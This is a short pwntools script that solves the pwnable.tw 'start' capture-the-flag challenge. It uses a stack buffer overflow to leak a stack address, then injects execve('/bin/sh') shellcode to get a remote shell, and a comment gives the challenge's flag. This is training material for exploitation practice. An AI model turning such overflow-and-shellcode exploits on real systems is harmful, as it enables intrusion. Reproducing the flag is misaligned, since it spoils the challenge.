#!/usr/bin/env python3

from pwn import *

exe = ELF("./start")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = connect("chall.pwnable.tw", 10000)

    return r


def main():
    r = conn()
    input()
    
    # good luck pwning :)
    shellcode = asm(
        '''
        mov al, 0xb
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
        ''', arch = 'i386')
    payload = b'A'*20 + flat(0x08048086)

    r.sendafter(b'CTF:', payload)
    pause()
    saved_ebp = u32(r.recv(4))
    info('Saved ebp: ' + hex(saved_ebp))
    payload = shellcode.ljust(20,b'\x00') + p32(saved_ebp-4) + b'/bin/sh\0'
    r.send(payload)
    pause()
    r.interactive()
# FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}

if __name__ == "__main__":
    main()

